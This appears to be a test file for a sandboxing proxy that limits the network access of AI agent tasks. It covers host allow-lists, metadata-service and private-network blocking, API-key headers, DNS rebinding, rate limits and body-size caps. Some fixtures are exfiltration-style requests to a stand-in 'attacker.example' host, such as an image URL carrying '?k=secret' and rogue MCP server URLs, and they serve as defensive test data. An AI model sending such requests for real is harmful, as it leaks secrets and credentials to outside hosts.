import assert from 'node:assert/strict';
import test from 'node:test';
import http from 'node:http';
import net from 'node:net';
import { MAX_MODEL_BODY, Tries, allowed, uidOf, anthropicPath, destination, factoryPath, fetchesOnItsOwn, fromScreen, sourceOf, startProxy, withKey } from './net.ts';
import type { Task } from './contract.ts';

test('a task reaches a name on the box only on the exact host:port it was given, never a box port', async () => {
  assert.match((await destination(['localhost:5555'], 'localhost', '5555')) ?? '', /^(127\.0\.0\.1|::1)$/); // either loopback: the OS decides which one "localhost" is
  assert.equal(await destination(['localhost'], 'localhost', '7700'), undefined); // the box API, through a loose entry
  assert.equal(await destination(['localhost'], 'localhost', '5555'), undefined); // on the box: needs host:port
  assert.equal(await destination(['localhost:3000'], 'localhost', '3000'), undefined); // SpacetimeDB, even if listed
  assert.equal(await destination(['localhost:8888'], 'localhost', '8888'), undefined); // the proxy itself
  assert.equal(await destination(['example.com'], 'other.com', '443'), undefined); // not on the list
});

test('link-local addresses (the cloud metadata service) are never reached, and a private network only on an exact host:port', async () => {
  const tailnet = ['100', '100', '1', '2'].join('.'); // in parts: the public check flags tailnet addresses in the repo
  process.env.BOX_HOSTS = JSON.stringify({ 'meta.test': '169.254.169.254', 'meta6.test': 'fe80::1', 'lan.test': '10.1.2.3', 'tail.test': tailnet, 'ula.test': 'fd00::1', 'mapped.test': '::ffff:192.168.1.1', 'pub.test': '203.0.113.5' });
  try {
    assert.equal(await destination(['meta.test:80'], 'meta.test', '80'), undefined, 'not even when listed exactly');
    assert.equal(await destination(['meta6.test:80'], 'meta6.test', '80'), undefined);
    for (const h of ['lan.test', 'tail.test', 'ula.test', 'mapped.test']) {
      assert.equal(await destination([h], h, '80'), undefined, `${h} on a loose entry`);
      assert.ok(await destination([`${h}:80`], h, '80'), `${h} when the owner listed host:port`);
    }
    assert.equal(await destination(['*.test'], 'lan.test', '443'), undefined, 'a wildcard never reaches the home network');
    assert.equal(await destination(['pub.test'], 'pub.test', '443'), '203.0.113.5');
  } finally {
    delete process.env.BOX_HOSTS;
  }
});

test('the real model key goes only into the key headers, never into one a service could quote back', () => {
  const P = 'sk-ant-placeholder-the-box-adds-the-key';
  const out = withKey({ host: 'evil', 'x-api-key': P, authorization: `Bearer ${P}`, 'anthropic-beta': P, 'x-other': `a ${P}` }, 'api.anthropic.com', P, 'sk-real');
  assert.equal(out.host, 'api.anthropic.com');
  assert.equal(out['x-api-key'], 'sk-real');
  assert.equal(out.authorization, 'Bearer sk-real');
  assert.equal(out['anthropic-beta'], P);
  assert.equal(out['x-other'], `a ${P}`);
});

test("only the box's own pages on this machine count as its screen", () => {
  const h = (x: Record<string, string>) => x;
  assert.ok(fromScreen(undefined, h({ host: 'box' }), 7700), 'the socket');
  assert.ok(fromScreen('127.0.0.1', h({ host: '127.0.0.1:7700' }), 7700), 'curl on the box');
  assert.ok(fromScreen('::1', h({ host: 'localhost:7700', origin: 'http://localhost:7700' }), 7700), "the box's own page");
  assert.ok(fromScreen('127.0.0.1', h({ host: '127.0.0.1:7700', origin: 'http://127.0.0.1:7700' }), 7700));
  assert.ok(fromScreen('127.0.0.1', h({ host: 'localhost', origin: 'http://localhost' }), 80), 'port 80 is left out of an origin');
  assert.ok(fromScreen('127.0.0.1', h({ host: '127.0.0.1:7700', origin: 'http://localhost:5173' }), 7700, ['http://localhost:5173']), 'a dev server named in BOX_ORIGINS');
  assert.ok(!fromScreen('127.0.0.1', h({ host: 'rebind.attacker.example:7700' }), 7700), 'DNS rebinding: a GET carries no Origin, but its Host gives it away');
  assert.ok(!fromScreen('127.0.0.1', h({ host: '127.0.0.1:7700', origin: 'http://localhost:8000' }), 7700), "a page from another server on this machine (an agent's dev server)");
  assert.ok(!fromScreen('127.0.0.1', h({ host: '127.0.0.1:7700', origin: 'https://evil.example' }), 7700), 'another site');
  assert.ok(!fromScreen('127.0.0.1', h({ host: '127.0.0.1:7700', origin: 'null' }), 7700), 'a sandboxed page or a file');
  assert.ok(!fromScreen('127.0.0.1', h({ host: '127.0.0.1:7700', 'x-forwarded-for': '203.0.113.9' }), 7700), 'relayed by a proxy');
  assert.ok(!fromScreen('10.0.0.5', h({ host: '127.0.0.1:7700' }), 7700), 'another machine');
  assert.ok(!fromScreen('127.0.0.1', h({ host: '127.0.0.1:7700', origin: 'http://localhost:5173' }), 7700, ['*']), "'*' lets a site call with a token, never as the screen");
});

test('a model call on your own Anthropic key may not have Anthropic fetch a page, an MCP server or a file for the task', () => {
  // What Droid sends (captured from droid 0.248 in own-key mode): its own tools, no server-side fetching.
  const droid = { model: 'claude-sonnet-5-5', max_tokens: 8192, stream: true, system: [{ type: 'text', text: 'x' }],
    tools: [{ name: 'Execute', description: 'run', input_schema: { type: 'object', properties: { url: { type: 'string' } } } }],
    messages: [{ role: 'user', content: [{ type: 'text', text: 'see https://example.com' }, { type: 'image', source: { type: 'base64', media_type: 'image/png', data: 'AAAA' } }] },
      { role: 'assistant', content: [{ type: 'tool_use', id: 't1', name: 'FetchUrl', input: { url: 'https://example.com', type: 'url' } }] }] };
  assert.equal(fetchesOnItsOwn(droid), undefined);
  assert.match(fetchesOnItsOwn({ ...droid, tools: [{ type: 'web_fetch_20250910', name: 'web_fetch' }] }) ?? '', /web_fetch/);
  assert.match(fetchesOnItsOwn({ ...droid, mcp_servers: [{ type: 'url', url: 'https://attacker.example/sse' }] }) ?? '', /MCP/);
  assert.ok(fetchesOnItsOwn({ messages: [{ role: 'user', content: [{ type: 'image', source: { type: 'url', url: 'https://attacker.example/?k=secret' } }] }] }));
  assert.match(fetchesOnItsOwn({ tools: [{ type: 'mcp', server_url: 'https://attacker.example' }] }) ?? '', /mcp/);
  assert.ok(fetchesOnItsOwn({ messages: [{ content: [{ type: 'image_url', image_url: { url: 'https://attacker.example/x.png' } }] }] }));
  assert.equal(fetchesOnItsOwn({ messages: [{ content: [{ type: 'image_url', image_url: { url: 'data:image/png;base64,AAAA' } }] }] }), undefined);
});

test('wrong pairing codes are limited per address and overall, so one address cannot lock everyone out', () => {
  assert.equal(sourceOf('127.0.0.1', { 'x-forwarded-for': '192.0.2.4, 203.0.113.9' }), '203.0.113.9', 'the setup port and Caddy put the caller last');
  assert.equal(sourceOf('198.51.100.7', { 'x-forwarded-for': '10.0.0.1' }), '198.51.100.7', 'a header from another machine is not believed');
  const t = new Tries(5, 60);
  const now = 1_000_000;
  for (let i = 0; i < 5; i++) assert.equal(t.refusal('a', now), undefined), t.wrong('a', now);
  assert.match(t.refusal('a', now) ?? '', /from here/, 'the sixth wrong code from one address in a minute waits');
  assert.equal(t.refusal('b', now), undefined, 'another address still pairs');
  assert.equal(t.refusal('a', now + 60_001), undefined, 'a minute later it may try again');
  for (let i = 0; i < 60; i++) t.wrong(`n${i}`, now);
  assert.match(t.refusal('fresh', now) ?? '', /too many wrong/, 'many addresses together are capped too');
});

test('only the Factory calls Droid makes are relayed with the owner\'s Factory key', () => {
  for (const ok of ['/api/llm/o/v1/responses', '/api/llm/a/v1/messages', '/api/cli/whoami', '/api/feature-flags', '/api/organization/managed-settings', '/api/billing/limits', '/api/connectors/tools/list', '/api/apps/cloud-sync/sessions/batch', '/api/ingest'])
    assert.ok(factoryPath(ok), ok);
  for (const no of ['/api/connectors/tools/call', '/api/sessions', '/api/feature-flags/x', '/api/billing/limits/../keys', '/v1/messages', '/'])
    assert.ok(!factoryPath(no), no);
});

test('only the Anthropic calls Droid makes are relayed with the owner\'s Anthropic key', () => {
  for (const ok of ['/v1/messages', '/v1/messages/count_tokens', '/v1/models', '/v1/models/claude-haiku-4-5']) assert.ok(anthropicPath(ok), ok);
  for (const no of ['/v1/files', '/v1/messages/batches', '/v1/skills', '/v1/organizations/users', '/v1/complete', '/v1/models/../files', '/'])
    assert.ok(!anthropicPath(no), no);
});

test('a wildcard host with a port matches its subdomains on that port only', () => {
  assert.ok(allowed(['*.example.com:443'], 'api.example.com', '443'));
  assert.ok(!allowed(['*.example.com:443'], 'api.example.com', '80'));
  assert.ok(!allowed(['*.example.com:443'], 'example.com', '443'), 'the subdomains, not the name itself');
  assert.ok(allowed(['*.example.com'], 'a.b.example.com', '8080'));
  assert.ok(allowed(['example.com:8080'], 'example.com', '8080') && !allowed(['example.com:8080'], 'example.com', '80'));
  assert.ok(!allowed(['*.example.com'], 'badexample.com', '443'));
});

test('the proxy reads every model call: no compressed or non-JSON body, at most 32 MB each and 64 MB a task at once', async () => {
  process.env.BOX_PROXY_PORT = 'auto';
  const blocked: string[] = [];
  const task = { id: 'tproxytest', worker: 'droid', hosts: [] } as unknown as Task;
  const port = await startProxy(
    { taskOf: () => task, blocked: (_t, host) => blocked.push(host), leaked: () => false, factoryKey: () => 'fk-real', anthropicKey: () => undefined },
    { key: Buffer.from(''), cert: Buffer.from('') },
  );
  // A plain path is Droid's Factory API (FACTORY_API_BASE_URL); its model calls are read before they go on.
  const send = (headers: Record<string, string>, body?: Buffer, end = true) =>
    new Promise<{ status: number; req: http.ClientRequest }>((resolve) => {
      const req = http.request({ host: '127.0.0.1', port, path: '/api/llm/a/v1/messages', method: 'POST', headers });
      req.on('response', (r) => (r.resume(), resolve({ status: r.statusCode ?? 0, req })));
      req.on('error', () => {});
      if (body) req.write(body);
      if (end) req.end();
    });
  try {
    assert.equal((await send({ 'content-encoding': 'gzip', 'content-type': 'application/json' }, Buffer.from('x'))).status, 415, 'a compressed body is refused');
    assert.equal((await send({ 'content-type': 'application/json' }, Buffer.from('not json'))).status, 415, 'a body the box cannot read is refused');
    assert.ok(blocked.some((b) => /gzip/.test(b)) && blocked.some((b) => /not JSON/.test(b)), 'both are logged as blocked');
    assert.equal((await send({ 'content-length': String(MAX_MODEL_BODY + 1) }, Buffer.alloc(MAX_MODEL_BODY + 1, 32))).status, 413, 'over 32 MB in one call');
    // Two calls of 30 MB held open, then a third: together past 64 MB.
    const big = Buffer.alloc(30 * 1024 ** 2, 32);
    const open = [0, 1].map(() => http.request({ host: '127.0.0.1', port, path: '/api/llm/a/v1/messages', method: 'POST', headers: { 'content-length': String(big.length + 1) } }).on('error', () => {}));
    for (const r of open) r.write(big);
    await new Promise((r) => setTimeout(r, 300));
    assert.equal((await send({ 'content-length': String(big.length + 1) }, big, false)).status, 413, 'a third call past 64 MB at once');
    for (const r of open) r.destroy();
  } finally {
    delete process.env.BOX_PROXY_PORT;
  }
});

test('the owner of each loopback connection is found from /proc/net/tcp', async () => {
  const seen: (number | undefined)[] = [];
  const server = net.createServer((sock) => void seen.push(uidOf(sock)));
  await new Promise<void>((r) => server.listen(0, '127.0.0.1', r));
  const port = (server.address() as net.AddressInfo).port;
  const clients = await Promise.all(Array.from({ length: 200 }, () => new Promise<net.Socket>((r) => { const c = net.connect(port, '127.0.0.1', () => r(c)); })));
  for (let i = 0; i < 200 && seen.length < 200; i++) await new Promise((r) => setTimeout(r, 20));
  for (const c of clients) c.destroy();
  server.close();
  assert.equal(seen.length, 200);
  assert.ok(seen.every((u) => u === process.getuid!()), 'every connection is ours');
});
